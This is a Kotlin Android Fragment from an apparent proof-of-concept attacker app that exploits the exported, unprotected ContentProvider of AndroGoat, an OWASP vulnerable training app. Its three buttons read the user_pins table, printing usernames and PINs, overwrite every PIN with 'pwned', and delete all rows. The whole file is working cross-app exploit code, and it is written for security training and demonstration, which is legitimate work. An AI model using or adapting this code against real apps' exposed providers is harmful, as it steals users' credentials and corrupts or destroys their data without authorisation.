package dev.xbara0x.androgoatpoc.ui.provider

import android.content.ContentValues
import android.net.Uri
import android.os.Bundle
import android.util.Log
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import androidx.fragment.app.Fragment
import dev.xbara0x.androgoatpoc.databinding.FragmentProviderBinding

private const val TAG = "AndroGoatPoC"
private const val AUTHORITY = "owasp.sat.agoat.provider.userpinsprovider"
private val PINS_URI: Uri = Uri.parse("content://$AUTHORITY/user_pins")

/**
 * Reads and tampers with AndroGoat's exported ContentProvider.
 *
 * AndroGoat declares `ContentProviderActivity` as a `<provider>` with
 * `android:exported="true"`, authority `owasp.sat.agoat.provider.userpinsprovider`,
 * and no readPermission/writePermission. Its query/insert/update/delete do no caller
 * check, so any app can read, overwrite and delete the `user_pins` table. Unlike the
 * broadcast receiver lesson (data shown only in a Toast on the victim's UI), this is
 * real cross-app data access -- confidentiality and integrity.
 */
class ProviderLeakFragment : Fragment() {

    private var _binding: FragmentProviderBinding? = null
    private val binding get() = _binding!!

    // Keeps a running log so the screen shows the effect of each action in sequence.
    private val log = StringBuilder()

    override fun onCreateView(
        inflater: LayoutInflater,
        container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View {
        _binding = FragmentProviderBinding.inflate(inflater, container, false)
        return binding.root
    }

    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
        super.onViewCreated(view, savedInstanceState)

        binding.buttonReadProvider.setOnClickListener { readPins() }
        binding.buttonUpdateProvider.setOnClickListener { overwritePins() }
        binding.buttonDeleteProvider.setOnClickListener { deletePins() }
    }

    private fun append(line: String) {
        log.append(line).append('\n')
        binding.textProviderContent.text = log.toString()
    }

    private fun readPins() {
        try {
            val cursor = requireContext().contentResolver.query(PINS_URI, null, null, null, null)
            if (cursor == null) {
                append("READ: provider returned no cursor. Is AndroGoat installed?")
                return
            }
            cursor.use { c ->
                val idIdx = c.getColumnIndex("id")
                val userIdx = c.getColumnIndex("username")
                val pinIdx = c.getColumnIndex("pin")
                val sb = StringBuilder("READ: ${c.count} row(s)\n")
                while (c.moveToNext()) {
                    val id = if (idIdx >= 0) c.getLong(idIdx) else 0L
                    val user = if (userIdx >= 0) c.getString(userIdx) else "?"
                    val pin = if (pinIdx >= 0) c.getString(pinIdx) else "?"
                    sb.append("#$id  $user / $pin\n")
                }
                Log.i(TAG, "Read ${c.count} row(s) from $AUTHORITY")
                append(sb.toString().trimEnd())
            }
        } catch (e: SecurityException) {
            append("READ: SecurityException (${e.message})")
        } catch (e: Exception) {
            append("READ failed: ${e.javaClass.simpleName}: ${e.message}")
        }
    }

    private fun overwritePins() {
        try {
            val values = ContentValues().apply { put("pin", "pwned") }
            val rows = requireContext().contentResolver.update(PINS_URI, values, null, null)
            Log.i(TAG, "Tampered $rows row(s) in $AUTHORITY")
            append("UPDATE: $rows row(s) now have pin=\"pwned\"")
        } catch (e: Exception) {
            append("UPDATE failed: ${e.javaClass.simpleName}: ${e.message}")
        }
    }

    private fun deletePins() {
        try {
            val rows = requireContext().contentResolver.delete(PINS_URI, null, null)
            Log.i(TAG, "Deleted $rows row(s) from $AUTHORITY")
            append("DELETE: $rows row(s) removed")
        } catch (e: Exception) {
            append("DELETE failed: ${e.javaClass.simpleName}: ${e.message}")
        }
    }

    override fun onDestroyView() {
        super.onDestroyView()
        _binding = null
    }
}